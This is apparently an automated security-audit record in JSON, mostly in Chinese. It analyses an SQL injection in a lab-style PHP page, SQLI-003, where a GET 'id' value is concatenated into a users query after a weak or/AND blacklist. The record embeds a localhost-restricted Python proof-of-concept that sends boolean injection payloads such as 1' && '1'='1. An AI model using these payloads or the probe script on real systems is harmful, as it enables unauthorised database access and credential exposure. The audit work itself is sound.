@@ -1,0 +1,153 @@
+{
+  "schema_version": "wp2-output-v1",
+  "sample_id": "SQLI-003",
+  "input_version": "v2",
+  "prompt_version": "final-wp4-v2",
+  "analysis_stage": "parent",
+  "received_packet_ids": [
+    "SQLI-003"
+  ],
+  "prediction": "存在候选",
+  "verdict": "待验证",
+  "confidence": {
+    "level": "high",
+    "reason": "静态证据完整：第7行读取 GET 参数 id，第13行仅经 blacklist 删除 or/AND 子串，第16行直接拼入单引号值位，第17行执行查询，第19-26行回显查询结果，构成可控输入→拼接→执行→可观测输出的闭合链路；缺口仅为未提供 sql-connect.php 连接实现、部署 URL 与运行版本，故 verdict 保持待验证而非确认。"
+  },
+  "findings": [
+    {
+      "finding_id": "SQLI-003-F1",
+      "vulnerability_type": "SQL注入",
+      "locations": [
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 7,
+          "line_end": 7,
+          "quote": "$id=$_GET['id'];"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 13,
+          "line_end": 13,
+          "quote": "$id= blacklist($id);"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 16,
+          "line_end": 16,
+          "quote": "$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 17,
+          "line_end": 17,
+          "quote": "$result=mysql_query($sql);"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 40,
+          "line_end": 41,
+          "quote": "$id= preg_replace('/or/i',\"\", $id);"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 22,
+          "line_end": 22,
+          "quote": "echo 'Your Login name:'. $row['username'];"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 30,
+          "line_end": 30,
+          "quote": "print_r(mysql_error());"
+        }
+      ],
+      "data_flow": [
+        "入口：第5行 if(isset($_GET['id'])) 判定参数存在，第7行 $id=$_GET['id'] 读取 GET 参数 id，值为字符串且完全由请求方控制。",
+        "记录：第9-11行把原始 id 追加写入 result.txt，不改写变量，但可控内容落盘（范围外风险）。",
+        "过滤：第13行调用 blacklist；函数体第40-41行仅用 preg_replace 删除子串 or 与 AND（不区分大小写），未转义单引号、双引号、反斜杠、注释符，也未改用参数绑定，因此不改变单引号值上下文，不构成 SQL 注入防护。",
+        "构造：第16行把处理后仍含引号的 $id 直接插入 \"SELECT * FROM users WHERE id='$id' LIMIT 0,1\" 的单引号字面量中，属值位置字符串拼接；以 1' 闭合引号后可追加布尔表达式（&&）、UNION 或注释符改变查询语义。",
+        "执行：第17行 mysql_query($sql) 执行该拼接语句，第18行 mysql_fetch_array 取首行。",
+        "观察：第19-26行命中时输出 Your Login name 与 Your Password；第30行未命中时 print_r(mysql_error()) 输出数据库错误文本；第44行把过滤后的 $hint 回显，可用于确认过滤结果。",
+        "跨阶段：本父样本仅收到 1/1 包，无前置或后续包，不存在注册转义后再拼接的二阶路径；结论只覆盖本片段。"
+      ],
+      "principle": "字符串拼接型 SQL 注入（值上下文单引号未参数化）。第16行以 SELECT * FROM users WHERE id='$id' LIMIT 0,1 形式拼接，$id 来自 GET 参数；blacklist 只是把字面量 or/AND 子串删除，既不转义引号也未使用预处理绑定，攻击者可用 1' 闭合引号后追加 && 布尔表达式、UNION 或注释符改变查询语义。子类型：基于布尔差分的注入与联合查询注入（同一 id 参数）；过滤还会把 order 之类的正常词删成 der，说明它是粗暴字符串替换而非语法层防护。",
+      "impact": "绕过第16行 id='...' 的取值语义，按第19-26行的输出可读取 users 表任意命中行的 username/password，造成数据库敏感信息泄露（认证凭据外泄）；本片段只执行 SELECT，未展示写路径，写能力需另行确认。影响限于授权本地教学靶场与专用测试数据。",
+      "preconditions": [
+        "PHP 运行环境支持 mysql_* 扩展（PHP < 7.0 或额外安装兼容扩展），否则第17行先报接口错误，注入路径未到达。",
+        "sql-connections/sql-connect.php 未对 GET 输入做全局转义或参数化包装，且未开启会转义单引号的 magic_quotes_gpc。",
+        "部署使本片段成为顶层请求处理，GET 参数 id 可达（第5行分支成立）。",
+        "security 数据库 users 表存在可命中的测试行（基线 id=1），否则基线与真条件都不会返回行。",
+        "请求链路上没有额外 WAF 或前置组件拦截单引号与 && 字符。"
+      ],
+      "counterexamples": [
+        "若 include 的连接文件对 $_GET 统一 addslashes 或部署开启 magic_quotes_gpc，单引号会被转义为 \\'，第16行只能匹配字面量，布尔差分不成立。",
+        "若该值在拼接前改用预处理语句或 mysqli_real_escape_string 包装（片段中均未见），注入路径被阻断。",
+        "若服务端在拼接前做严格整数校验（is_numeric/intval 之类），非数字载荷会被拒绝；片段中没有此类校验，故该反例当前不成立，仅在部署差异下需复核。",
+        "若外层 WAF 拦截引号或 &&，请求在到达 PHP 前被拒；这属于部署条件差异，需按实际配置单独评估，不能用本片段推断所有配置。"
+      ],
+      "poc": {
+        "status": "需人工适配",
+        "language": "python",
+        "code": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"SQLI-003 本地授权靶场 SQL 注入验证草案（仅限本机回环地址）。\n\n代码依据（归一化样本 SQLI-003.php，1 起始行号）:\n  L5   if(isset($_GET['id']))                                    入口分支\n  L7   $id=$_GET['id'];                                          GET 参数 id 完全可控\n  L13  $id= blacklist($id);                                      仅删除子串 \"or\"/\"AND\"\n  L16  $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";      字符串拼接进单引号值位\n  L17  $result=mysql_query($sql);                                执行\n  L19-26 命中行输出 Your Login name / Your Password; L30 空结果输出 mysql_error()\n\n用法:\n  python sqli003_poc.py --base http://127.0.0.1:8080 --path /sqli/ \\\n      --param id --session-file ./cookie.txt\n\n约定:\n  * 参数名 id 来自代码; 请求路径未在片段中出现, 必须由 --path 由人工给出。\n  * 仅发送 4 个探测请求, 不枚举数据库、不导出数据、不批量写入。\n  * 不打印 Cookie、口令或完整凭据; 用户名/口令只打印长度与 SHA-256 前缀。\n  * 只允许 localhost/127.0.0.1/::1, 不跟随重定向, 单请求超时。\n\"\"\"\nimport argparse\nimport hashlib\nimport http.cookiejar\nimport re\nimport ssl\nimport sys\nimport urllib.error\nimport urllib.parse\nimport urllib.request\n\nALLOWED_HOSTS = {\"localhost\", \"127.0.0.1\", \"::1\"}\nRE_LOGIN = re.compile(r'Your Login name:\\s*([^<\\r\\n]*)')\nRE_PASS = re.compile(r'Your Password:\\s*([^<\\r\\n]*)')\nRE_HINT = re.compile(r'Hint: Your Input is Filtered with following result:\\s*([^<\\r\\n]*)')\nRE_ERRBOX = re.compile(r'<font color=\\s*\"#FFFF00\">(.*?)</font>', re.S | re.I)\nRE_PHP_ERR = re.compile(r'(Fatal error|Parse error|Warning:\\s*(mysql_|mysqli_)|Call to undefined function)', re.I)\n\nPROBES = (\n    (\"baseline\", \"1\", \"基线数字 id, 期望命中 id=1 的行\"),\n    (\"true_cond\", \"1' && '1'='1\", \"闭合单引号 + 恒真条件, 期望仍命中同一行\"),\n    (\"false_cond\", \"1' && '1'='2\", \"同一结构 + 恒假条件, 期望无命中行\"),\n    (\"quote_break\", \"1'\", \"仅闭合单引号, 期望出现 SQL 语法错误文本\"),\n)\n\n\nclass _NoRedirect(urllib.request.HTTPRedirectHandler):\n    def redirect_request(self, req, fp, code, msg, headers, newurl):\n        return None\n\n\ndef make_opener(cookie_file, insecure):\n    jar = http.cookiejar.MozillaCookieJar()\n    if cookie_file:\n        try:\n            jar.load(cookie_file, ignore_discard=True, ignore_expires=True)\n        except (OSError, http.cookiejar.LoadError) as exc:\n            print(\"[!] 会话文件加载失败(%s); 以未登录状态继续。\" % type(exc).__name__)\n            print(\"    若响应被重定向到登录页, 属于前置条件失败, 不能解释为过滤/编码生效。\")\n    handlers = [urllib.request.HTTPCookieProcessor(jar), _NoRedirect()]\n    if insecure:\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n        handlers.append(urllib.request.HTTPSHandler(context=ctx))\n    return urllib.request.build_opener(*handlers)\n\n\ndef validate_base(base):\n    parts = urllib.parse.urlsplit(base)\n    if parts.scheme not in (\"http\", \"https\"):\n        sys.exit(\"[!] --base 必须是 http/https 地址\")\n    host = (parts.hostname or \"\").lower()\n    if host not in ALLOWED_HOSTS:\n        sys.exit(\"[!] 仅允许本地回环目标, 拒绝主机: %s\" % host)\n    return parts\n\n\ndef request_once(opener, url, timeout):\n    req = urllib.request.Request(url, method=\"GET\", headers={\"User-Agent\": \"sqli003-poc/1.0\"})\n    try:\n        with opener.open(req, timeout=timeout) as resp:\n            return {\"kind\": \"response\",\n                    \"status\": getattr(resp, \"status\", resp.getcode()),\n                    \"body\": resp.read().decode(\"utf-8\", \"replace\"),\n                    \"detail\": None}\n    except urllib.error.HTTPError as exc:\n        try:\n            body = exc.read().decode(\"utf-8\", \"replace\")\n        except Exception:\n            body = \"\"\n        location = exc.headers.get(\"Location\") if exc.headers else None\n        return {\"kind\": \"http_error\", \"status\": exc.code, \"body\": body,\n                \"detail\": (\"Location: %s\" % location) if location else None}\n    except urllib.error.URLError as exc:\n        return {\"kind\": \"connection_error\", \"status\": None, \"body\": \"\",\n                \"detail\": str(exc.reason)}\n    except OSError as exc:\n        return {\"kind\": \"timeout_or_io\", \"status\": None, \"body\": \"\", \"detail\": str(exc)}\n\n\ndef digest(value):\n    return hashlib.sha256(value.encode(\"utf-8\", \"replace\")).hexdigest()[:12]\n\n\ndef analyse(body):\n    login = RE_LOGIN.search(body)\n    pwd = RE_PASS.search(body)\n    hint = RE_HINT.search(body)\n    errbox = RE_ERRBOX.search(body)\n    err_text = errbox.group(1).strip() if errbox else \"\"\n    return {\n        \"row_present\": bool(login) and bool(pwd),\n        \"login_len\": len(login.group(1).strip()) if login else 0,\n        \"login_digest\": digest(login.group(1).strip()) if login else None,\n        \"pwd_len\": len(pwd.group(1).strip()) if pwd else 0,\n        \"filtered_hint\": hint.group(1).strip() if hint else None,\n        \"db_error_text\": err_text,\n        \"empty_error_box\": bool(errbox) and err_text == \"\",\n        \"php_interface_error\": bool(RE_PHP_ERR.search(body)),\n    }\n\n\ndef main():\n    ap = argparse.ArgumentParser(description=\"SQLI-003 本地 SQL 注入验证草案\")\n    ap.add_argument(\"--base\", required=True, help=\"靶场基址, 例如 http://127.0.0.1:8080\")\n    ap.add_argument(\"--path\", required=True, help=\"样本所在路径, 来自部署环境(片段未给出)\")\n    ap.add_argument(\"--param\", default=\"id\", help=\"GET 参数名, 代码中的名称为 id\")\n    ap.add_argument(\"--session-file\", default=None, help=\"Netscape 格式 Cookie 文件, 不写入版本库\")\n    ap.add_argument(\"--timeout\", type=float, default=10.0, help=\"单请求超时秒数\")\n    ap.add_argument(\"--insecure\", action=\"store_true\", help=\"本地自签名 HTTPS 时跳过证书校验\")\n    args = ap.parse_args()\n\n    parts = validate_base(args.base)\n    opener = make_opener(args.session_file, args.insecure)\n    endpoint = \"%s://%s/%s\" % (parts.scheme, parts.netloc, args.path.lstrip(\"/\"))\n\n    results = {}\n    for name, payload, note in PROBES:\n        query = urllib.parse.urlencode({args.param: payload})\n        raw = request_once(opener, \"%s?%s\" % (endpoint, query), args.timeout)\n        if raw[\"kind\"] == \"response\":\n            info = analyse(raw[\"body\"])\n        else:\n            info = {\"row_present\": False, \"login_len\": 0, \"login_digest\": None,\n                    \"pwd_len\": 0, \"filtered_hint\": None, \"db_error_text\": \"\",\n                    \"empty_error_box\": False, \"php_interface_error\": False}\n        results[name] = {\"payload\": payload, \"note\": note, \"transport\": raw, \"obs\": info}\n        print(\"[%s] payload=%r\" % (name, payload))\n        print(\"    transport=%s status=%s%s\" % (\n            raw[\"kind\"], raw[\"status\"],\n            \"\" if not raw[\"detail\"] else \" detail=%s\" % raw[\"detail\"]))\n        if raw[\"kind\"] == \"response\":\n            o = info\n            print(\"    row_present=%s login_len=%s pwd_len=%s login_digest=%s\" % (\n                o[\"row_present\"], o[\"login_len\"], o[\"pwd_len\"], o[\"login_digest\"]))\n            if o[\"filtered_hint\"] is not None:\n                print(\"    filtered_hint=%r\" % o[\"filtered_hint\"])\n            if o[\"db_error_text\"]:\n                print(\"    db_error_text=%r\" % o[\"db_error_text\"][:160])\n            if o[\"php_interface_error\"]:\n                print(\"    php_interface_error=True\")\n\n    print(\"\")\n    print(\"== 判定辅助(仅本地观测, 不代替人工核验) ==\")\n    transport_kinds = {r[\"transport\"][\"kind\"] for r in results.values()}\n    if transport_kinds - {\"response\"}:\n        print(\"1) 前置条件失败: 至少一个请求不是正常响应(%s); 连接/超时/重定向不能解释为过滤生效。\"\n              % \",\".join(sorted(transport_kinds - {\"response\"})))\n    if any(r[\"obs\"][\"php_interface_error\"] for r in results.values()):\n        print(\"2) PHP 接口不兼容: 响应含 Fatal error/undefined function, 需先修正运行环境。\")\n    base = results[\"baseline\"][\"obs\"]\n    tru = results[\"true_cond\"][\"obs\"]\n    fal = results[\"false_cond\"][\"obs\"]\n    if not base[\"row_present\"]:\n        print(\"3) 基线未命中: 检查 --path/--param 是否正确、id=1 是否存在、是否被重定向到登录页。\")\n    else:\n        print(\"3) 基线命中: login_digest=%s pwd_len=%s\" % (\n            base[\"login_digest\"], base[\"pwd_len\"]))\n        if tru[\"row_present\"] and tru[\"login_digest\"] == base[\"login_digest\"] and not fal[\"row_present\"]:\n            print(\"4) 观测到布尔差分: 真条件沿用基线命中行, 假条件无命中行;\")\n            print(\"   该差异只在注入改变查询语义时出现, 仍需人工回看原始响应。\")\n        elif tru[\"row_present\"] and fal[\"row_present\"]:\n            print(\"4) 真/假条件均命中: 可能字段被提前截断或引号被转义, 差分不成立。\")\n        else:\n            print(\"4) 未观测到可区分的布尔差分: 检查引号是否被转义(magic_quotes/全局过滤)或 WAF 拦截。\")\n    q = results[\"quote_break\"][\"obs\"]\n    print(\"5) 引号诊断: db_error_text=%r\" % (\n        q[\"db_error_text\"][:160] if q[\"db_error_text\"] else \"\"))\n    print(\"   注意: 仅出现 SQL 错误文本只说明错误回显, 不能单独证明注入可利用;\")\n    print(\"   以 3)/4) 的行命中差异为主证据, 错误文本用于排除语法假设。\")\n    print(\"\")\n    print(\"提示: 运行结束后人工保存命令、环境、响应与截图; 不导出数据库内容。\")\n\n\nif __name__ == \"__main__\":\n    main()\n",
+        "artifact_path": null,
+        "dependencies": [
+          "Python 3.8+",
+          "仅标准库：argparse、hashlib、http.cookiejar、re、ssl、sys、urllib",
+          "无第三方库依赖",
+          "靶场侧：PHP 支持 mysql_* 扩展，security 数据库 users 表存在 id=1 的测试行"
+        ],
+        "parameters": [
+          "--base（必填）：靶场基址，仅允许 localhost/127.0.0.1/::1，例如 http://127.0.0.1:8080",
+          "--path（必填）：样本部署路径；片段未给出 URL 路径，须由人工按实际部署提供",
+          "--param（默认 id）：GET 参数名，取自第7行 $_GET['id']",
+          "--session-file：本地 Netscape 格式 Cookie 文件，不写入版本库，运行输出不打印内容",
+          "--timeout（默认 10.0）：单请求超时秒数",
+          "--insecure：仅本地自签名 HTTPS 时跳过证书校验"
+        ],
+        "steps": [
+          "准备本地授权靶场（localhost），取得样本实际部署路径，并确认 users 表存在 id=1 的测试行；需要登录时准备专用测试会话。",
+          "用 --base/--path/--param 传入基址、片段路径与代码中的参数名 id；会话用 --session-file 指向本地 Cookie 文件。",
+          "运行脚本，依次发送 baseline(1)、true_cond(1' && '1'='1)、false_cond(1' && '1'='2)、quote_break(1') 四个 GET 请求，超时 10s，不跟随重定向。",
+          "记录每个请求的 transport 类型、HTTP 状态、row_present、login_len、login_digest、filtered_hint 与截断后的 db_error_text，并人工保存原始响应与截图。",
+          "对照第3步与第4步：真条件命中行、假条件空行且与基线一致时记录为布尔差分观测；不导出任何列值，不枚举数据库。",
+          "如出现重定向、连接错误或 PHP 接口错误，按前置条件失败记录并修正环境后重跑，不改变参数名与路径来源。"
+        ],
+        "expected_observation": "1) baseline 返回 HTTP 200，响应含 'Your Login name:' 与 'Your Password:'（命中 id=1 行，凭据只显示长度与 SHA-256 前缀）；2) true_cond 的 login_digest 与 baseline 相同；3) false_cond 不出现 'Your Login name:' 字段，只出现空的黄色错误框 <font color= \"#FFFF00\"></font>；4) quote_break 的黄色错误框内出现 MySQL 语法错误文本，用于确认引号闭合假设；5) 若 false_cond 仍命中或 true_cond 报语法错误，则引号被转义或过滤，属前置条件不成立，不得记为注入失败。",
+        "success_criteria": "1) 基线请求返回 200 且解析出非空 username/password 字段，证明目标路径与参数名正确；2) 真条件载荷 1' && '1'='1 解析出的 login_digest 与基线一致，说明注入值仍落在同一行；3) 假条件载荷 1' && '1'='2 解析不到 'Your Login name:' 字段，与真条件形成可复现的行命中/空行差分，而不是只看报错或状态码；4) 三个请求的 filtered_hint 与发送载荷对照记录，显示过滤后值被删改情况；5) 引号诊断只作为错误回显记录，不作为注入成功的唯一依据；6) 任一次请求出现重定向、连接失败或 PHP Fatal error 时只记为前置条件/环境失败，不判为过滤生效。",
+        "limitations": [
+          "连接实现 sql-connections/sql-connect.php 与 db-creds.inc 未提供，无法确认字符集、转义方式与 mysql_* 包装，部署差异需人工复核。",
+          "片段未给出 URL 路径，--path 必须人工适配；参数名 id 来自代码，不猜测其他表单字段。",
+          "blacklist 会删除子串 or/and（连带 order、AND 关联词），载荷不能含这些子串；本草案改用 && 布尔表达式与引号闭合，属受过滤约束的最小验证。",
+          "草案未运行，execution_status=未运行；任何未执行结论都不能升级为确认。",
+          "未验证 UNION 取数与注释符标签，避免导出数据；如需进一步证据，应在授权范围内另行记录并保留恢复说明。"
+        ],
+        "execution_status": "未运行"
+      }
+    }
+  ],
+  "exclusion_evidence": [],
+  "missing_context": [
+    "sql-connections/sql-connect.php 的连接方式、字符集设置、是否全局转义或包装输入。",
+    "db-creds.inc 内容与 security 数据库 users 表结构、是否确实存在 id=1 的行。",
+    "实际部署的 PHP/MySQL 版本及 mysql_* 兼容层配置。",
+    "样本的实际 URL 路径、是否为顶层入口、是否需要认证或会话。",
+    "是否启用 magic_quotes_gpc、addslashes 等全局输入处理，以及是否存在 WAF 或难度插件。"
+  ],
+  "risk_notes": [
+    "第30行 print_r(mysql_error()) 将数据库错误回显给客户端，属信息泄露（范围外风险），可辅助定位但不等同注入成立。",
+    "第9-11行把过滤前的 id 原文追加写入 result.txt，存在日志注入与敏感输入落盘风险（范围外）。",
+    "第44行把过滤后的 $hint 未做 HTML 转义直接输出，若存在编码差异可能构成反射型 XSS（范围外，未验证）。"
+  ],
+  "quality_notes": [
+    "mysql_* 函数自 PHP 7.0 起移除，代码依赖过时接口，需兼容层或旧版本 PHP；属环境兼容问题，不作为 SQL 注入证据。",
+    "blacklist 以子串删除过滤关键字，会误伤 order 等正常词并制造错误安全感，属防护设计缺陷。",
+    "变量 $hint 在第14行赋值、第44行使用，命名与用途不一致，可读性差。"
+  ],
+  "limitations": [
+    "本次仅静态审计 1/1 个输入包，无运行证据，verdict 只能为待验证。",
+    "连接文件、部署路径与运行版本缺失，无法确认运行期字符集与转义状态。",
+    "POC 为草案且未执行；其中 --path 需人工适配，参数名 id 来自代码。",
+    "未验证 UNION/注释符等更强载荷，避免越界取数。"
+  ],
+  "runtime_evidence": []
+}
